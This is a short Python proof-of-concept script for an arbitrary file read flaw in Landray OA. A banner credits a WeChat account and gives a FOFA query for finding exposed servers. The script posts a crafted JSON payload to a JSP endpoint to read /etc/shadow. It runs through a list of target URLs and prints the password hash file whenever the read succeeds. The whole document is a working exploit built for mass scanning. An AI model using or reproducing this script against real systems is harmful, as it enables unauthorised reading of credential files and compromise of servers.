import base64
import requests
import random
import re
import json
import sys

def title():
    print(' \033[36m+------------------------------------------                         \033[0m')
    print('+  \033[31m公众号 : 深夜笔记本                                                  \033[0m')
    print('+  \033[31m名称: 蓝凌OA 任意文件读取                                             \033[0m')
    print('+  \033[31m使用格式:  python3 poc.py                                           \033[0m')
    print('+  \033[31mVersion: fofa：app="Landray-OA系统"                                 \033[0m')
    print('+  \033[31mUrl      保存链接到url.txt                                           \033[0m')
    print(' \033[36m+------------------------------------------                          \033[0m')


def poc(target_url):
    url = target_url + "/sys/ui/extend/varkind/custom.jsp"
    headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded"
    }
    data = 'var={"body":{"file":"file:///etc/shadow"}}'
    try:
        r = requests.post(url=url, data=data, headers=headers, verify=False, timeout=10)
        print("\033[36m[o] 请求 {}/sys/ui/extend/varkind/custom.jsp \033[0m".format(target_url))
        if "root:" in r.text and r.status_code == 200:
            print("\033[31m[o] 读取 /etc/shadow 成功\n[o] 内容:{} \033[36m".format(r.text))

    except Exception as x:
        print("\033[36m[x] 请求失败:{} \033[0m".format(x))

if __name__ == '__main__':
    title()
    with open('url.txt', 'r', encoding='utf-8') as f:
        for i in f.readlines():
            s = i.strip()
            target_url = s
            poc(target_url)
